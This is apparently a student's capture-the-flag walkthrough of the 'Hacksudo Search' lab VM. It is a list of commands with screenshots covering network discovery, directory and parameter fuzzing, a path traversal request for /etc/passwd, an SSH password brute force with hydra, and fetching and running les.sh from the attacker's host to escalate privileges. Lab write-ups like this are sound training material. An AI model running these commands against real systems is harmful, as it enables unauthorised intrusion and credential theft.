# Hacksudo Search 192.168.56.112
## Andrea Zonnekus 18758119

sudo netdiscover -i eth0

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.001.png)

sudo nmap -p- -sV -O 192.168.56.112 -oN host

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.002.png)

gobuster dir -u 192.168.56.112 -w /usr/share/dirb/wordlists/big.txt -o http\_enum -x php,html,js,txt

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.003.png)



gobuster dir -u 192.168.56.112/account -w /usr/share/dirb/wordlists/big.txt -o http\_enum -x php,html,js,txt

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.004.png)

nikto --host <http://192.168.56.112>

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.005.png)

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.006.png)



wfuzz -u 192.168.56.112/search1.php?FUZZ=contact.php -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hl 137

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.007.png)

<http://192.168.56.112/search1.php?me=../../../../../../../etc/passwd>

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.008.png)

cat passwd | grep /bin/bash

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.009.png)

hydra -L Documents/hacksudo/users.txt -p MyD4dSuperH3r0! ssh://192.168.56.112 -m ssh

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.010.png)

cat user.txt

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.011.png)



wget 192.168.56.101/les.sh

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.012.png)

./les.sh

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.013.png)

![A screenshot of a computer

Description automatically generated with medium confidence](Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.014.png)

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.015.png)

cat root.txt

![](hacksudo_search_steps/Aspose.Words.11ea79bf-198c-44ea-b54f-90b26243ab45.016.png)
